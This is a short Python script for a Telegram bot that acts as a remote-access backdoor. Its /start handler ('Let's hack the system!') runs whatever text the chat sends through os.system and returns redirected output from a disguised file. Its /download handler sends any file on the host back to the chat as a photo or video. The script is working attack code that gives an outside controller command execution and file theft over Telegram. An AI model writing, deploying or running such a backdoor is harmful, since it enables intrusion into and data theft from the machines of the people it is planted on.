import os
import telebot as tb

BOT_TOKEN = ''

bot = tb.TeleBot(BOT_TOKEN)

def hack(message):
    command = message.text;
    try:
        os.system(command)
    except:
        msg = bot.send_message(message.chat.id, 'Failed command insertion :(')
    if '>' in command:
        fp = open('ddyl_shared_arm_x86_64.txt', 'rb')
        bot.send_message(message.chat.id, fp.read())

def sendMedia(message):
    try:
        if 'photo' in message.text:
            bot.send_message(message.chat.id, 'Hang On!')
            bot.send_photo(message.chat.id, open(message.text.split(' ')[1], 'rb'))
        elif 'video' in message.text:
            bot.send_message(message.chat.id, 'Hang On!')
            bot.send_video(message.chat.id, open(message.text.split(' ')[1], 'rb'), supports_streaming=True)
        else:
            bot.send_message(message.chat.id, 'Wrong command is given.')
    except:
        bot.send_message(message.chat.id, 'Falied to download or Try again with new path')
    
@bot.message_handler(commands=['start', 'hello'])
def send_welcome(message):
    msg = bot.send_message(message.chat.id, "Let's hack the system!")
    bot.register_next_step_handler(msg, hack)

@bot.message_handler(commands=['download'])
def downloader(message):
    msg = bot.send_message(message.chat.id, "enter photo or video? with path")
    bot.register_next_step_handler(msg, sendMedia)
    
bot.infinity_polling()
